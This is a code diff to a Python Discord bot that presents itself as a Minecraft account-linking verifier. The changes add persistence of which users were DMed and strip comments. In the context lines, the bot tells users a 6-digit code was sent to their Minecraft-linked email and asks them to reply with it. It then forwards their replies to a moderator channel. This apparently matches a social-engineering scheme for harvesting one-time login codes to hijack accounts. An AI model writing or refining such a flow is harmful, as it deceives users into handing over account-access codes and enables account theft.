@@ -7,6 +7,7 @@ TOKEN = os.getenv("DISCORD_TOKEN")
 VERIFICATION_CHANNEL_ID = 1362951881827160295
 MOD_CHANNEL_ID = 1362997933552959558
 LAST_VERIFICATION_MSG_FILE = "last_verification_msg.json"
+SENT_DM_FILE = "sent_dm.json"
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -15,24 +16,33 @@ intents.dm_messages = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-sent_verification_dms = set()
+# Persistent sets
 sent_invalid_codes = set()
 
 def load_last_verification_msg_id():
-    """Load the last verification message ID from the file."""
     if os.path.exists(LAST_VERIFICATION_MSG_FILE):
         with open(LAST_VERIFICATION_MSG_FILE, "r") as file:
             data = json.load(file)
-            print(f"Loaded last_verification_msg_id: {data.get('last_verification_msg_id')}")  # Debug log
+            print(f"Loaded last_verification_msg_id: {data.get('last_verification_msg_id')}")
             return data.get("last_verification_msg_id")
     return None
 
 def save_last_verification_msg_id(msg_id):
-    """Save the last verification message ID to the file."""
     with open(LAST_VERIFICATION_MSG_FILE, "w") as file:
         json.dump({"last_verification_msg_id": msg_id}, file)
-        print(f"Saved last_verification_msg_id: {msg_id}")  # Debug log
+        print(f"Saved last_verification_msg_id: {msg_id}")
 
+def load_sent_dm_ids():
+    if os.path.exists(SENT_DM_FILE):
+        with open(SENT_DM_FILE, "r") as f:
+            return set(json.load(f))
+    return set()
+
+def save_sent_dm_ids(sent_set):
+    with open(SENT_DM_FILE, "w") as f:
+        json.dump(list(sent_set), f)
+
+sent_verification_dms = load_sent_dm_ids()
 last_verification_msg_id = load_last_verification_msg_id()
 
 class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
@@ -57,7 +67,7 @@ class LinkView(discord.ui.View):
         await interaction.response.send_modal(VerifyModal())
 
 async def send_verification_embed():
-    global last_verification_msg_id  # Add this line to reference the global variable
+    global last_verification_msg_id
     channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
 
 @bot.event
@@ -70,17 +80,14 @@ async def on_ready():
     except Exception as e:
         print(f"Error syncing commands: {e}")
 
-    # Fetch the verification channel
     verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
 
-    # Check the last 50 messages to find and delete the previous embed
     async for message in verification_channel.history(limit=50):
         if message.author == bot.user and message.embeds:
             embed = message.embeds[0]
             if embed.title == "🔗 Link Your Minecraft Account":
                 await message.delete()
 
-    # Create and send the new verification embed with the LinkAccount button
     embed = discord.Embed(
         title="🔗 Link Your Minecraft Account",
         description="Click the **Link Account** button below to start verification.",
@@ -88,7 +95,6 @@ async def on_ready():
     )
     embed.set_footer(text="This is an automated message.")
     await verification_channel.send(embed=embed, view=LinkView())
-
 
 @bot.tree.command(name="setup")
 async def setup(interaction: discord.Interaction):
@@ -100,11 +106,11 @@ async def promptcode(interaction: discord.Interaction, user: discord.Member):
     if user.id in sent_verification_dms:
         await interaction.response.send_message("✅ Already sent the prompt.", ephemeral=True)
         return
-    
+
     try:
         embed = discord.Embed(
             title="📨 Minecraft Server Verification",
-            description=( 
+            description=(
                 "We've sent a 6-digit code to your email linked to Minecraft.\n\n"
                 "Reply to this DM with the code to complete verification.\n\n"
                 "🔒 Your info is private. Don't share your code."
@@ -113,10 +119,9 @@ async def promptcode(interaction: discord.Interaction, user: discord.Member):
         )
         await user.send(embed=embed)
         sent_verification_dms.add(user.id)
-        # Acknowledge the interaction after the DM is successfully sent
+        save_sent_dm_ids(sent_verification_dms)
         await interaction.response.send_message("✅ Prompt sent.", ephemeral=True)
     except discord.errors.Forbidden:
-        # Handle the case where the bot can't send a DM
         await interaction.response.send_message("❌ Couldn't send DM. Please make sure your DMs are open.", ephemeral=True)
 
 @bot.event
@@ -133,7 +138,6 @@ async def on_message(message: discord.Message):
                 color=discord.Color.teal()
             )
             await mod.send(embed=embed)
-            # Send confirmation embed for code submission
             confirm_embed = discord.Embed(
                 title="✅ Code Received",
                 description="A mod will review your code shortly.",
